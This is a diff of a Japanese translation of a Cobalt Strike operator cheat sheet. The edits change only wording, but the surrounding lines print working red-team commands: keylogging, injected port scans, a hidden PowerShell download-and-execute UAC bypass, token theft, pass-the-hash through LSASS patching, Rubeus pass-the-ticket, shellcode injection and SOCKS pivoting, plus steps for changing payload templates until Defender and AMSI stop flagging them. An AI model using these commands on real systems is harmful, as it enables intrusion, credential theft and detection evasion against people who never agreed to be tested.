@@ -17,7 +17,7 @@
 
 ### ペイロードの生成とホスティング
 
-#### ファイル内のペイロードの生成
+#### ファイル内でのペイロードの生成
 
 `Attacks -> Packages ->`&#x20;
 
@@ -28,7 +28,7 @@
 
 #### ペイロードの生成とホスティング
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` これにより、Cobalt Strikeからビークンをダウンロードするためのスクリプト/実行可能ファイルが生成されます。形式は bitsadmin、exe、powershell、python などです。
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` これにより、cobalt strikeからビークンをダウンロードするためのスクリプト/実行可能ファイルが生成されます。形式は bitsadmin、exe、powershell、python などです。
 
 #### ペイロードのホスティング
 
@@ -50,11 +50,11 @@ keylogger [pid] [x86|x64]
 ## 表示 > キーストロークで押されたキーを確認する
 
 # ポートスキャン
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内にポートスキャンアクションを注入
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内でポートスキャンアクションを注入
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
-# PowerShell
-# PowerShell モジュールをインポート
+# Powershell
+# Powershell モジュールをインポート
 powershell-import C:\path\to\PowerView.ps1
 powershell &#x3C;ここにpowershellコマンドを記述>
 
@@ -73,7 +73,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## pidからトークンを盗む
 ## make_tokenのようですが、プロセスからトークンを盗む
 steal_token [pid] # これはネットワークアクションに役立ちますが、ローカルアクションには役立ちません
-## APIドキュメントから、このログオンタイプは「呼び出し元が現在のトークンをクローンできることを許可します」とわかります。これが、ビークンの出力に「なりすまし &#x3C;current_username>」と表示される理由です - 自分のクローントークンをなりすましています。
+## APIドキュメントから、このログオンタイプは「呼び出し元が現在のトークンをクローンすることを許可します」とわかります。これが、ビークンの出力に「なりすまし &#x3C;current_username>」と表示される理由です - 自分のクローントークンをなりすましています。
 ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
 rev2self # steal_tokenからのトークンの使用を停止
 
@@ -86,7 +86,7 @@ inject [pid] [x64|x86] [listener]
 ## OpSecの観点から: 本当に必要でない限り、クロスプラットフォームの注入は行わないでください（例: x86 -> x64 または x64 -> x86）。
 
 ## ハッシュをパス
-## この修正プロセスは、LSASSメモリのパッチを必要とし、高リスクのアクションであり、ローカル管理者権限が必要で、Protected Process Light (PPL) が有効な場合はあまり実行可能ではありません。
+## この修正プロセスはLSASSメモリのパッチを必要とし、高リスクのアクションであり、ローカル管理者権限が必要で、Protected Process Light (PPL) が有効な場合はあまり実行可能ではありません。
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
@@ -98,9 +98,9 @@ steal_token &#x3C;pid> # mimikatzによって作成されたプロセスから�
 ## チケットをパス
 ## チケットをリクエスト
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
-## 新しいチケットを使用するための新しいログオンセッションを作成します（侵害されたものを上書きしないため）。
+## 新しいチケットを使用するための新しいログオンセッションを作成（侵害されたものを上書きしないため）
 make_token &#x3C;domain>\&#x3C;username> DummyPass
-## 攻撃者のマシンにチケットを書き込み、PowerShellセッションから読み込みます &#x26; 
+## 攻撃者のマシンにチケットを書き込み、poweshellセッションから読み込む &#x26; 
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -170,7 +170,7 @@ shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64プロセスにMetasploitシェ
 
 
 # ピボッティング
-## チームサーバーでソックスプロキシを開く
+## チームサーバーでsocksプロキシを開く
 beacon> socks 1080
 
 # SSH接続
@@ -180,7 +180,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### アーティファクトキット
 
-通常、`/opt/cobaltstrike/artifact-kit` に、Cobalt Strikeがバイナリビークンを生成するために使用するコードと事前コンパイルされたテンプレート（`/src-common`内）を見つけることができます。
+通常、`/opt/cobaltstrike/artifact-kit` で、Cobalt Strikeがバイナリビークンを生成するために使用するコードと事前コンパイルされたテンプレート（`/src-common`内）を見つけることができます。
 
 生成されたバックドア（またはコンパイルされたテンプレート）を使用して [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、Defenderがトリガーされる原因を特定できます。通常は文字列です。したがって、バックドアを生成しているコードを修正して、その文字列が最終的なバイナリに表示されないようにすることができます。
 
@@ -192,7 +192,7 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
 ### Resource Kit
 
-ResourceKitフォルダーには、Cobalt Strikeのスクリプトベースのペイロード用のテンプレートが含まれています。これにはPowerShell、VBA、HTAが含まれます。
+ResourceKitフォルダーには、Cobalt Strikeのスクリプトベースのペイロードのテンプレートが含まれています。これにはPowerShell、VBA、HTAが含まれます。
 
 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)をテンプレートと一緒に使用することで、Defender（この場合はAMSI）が好まないものを見つけて修正できます。
 ```
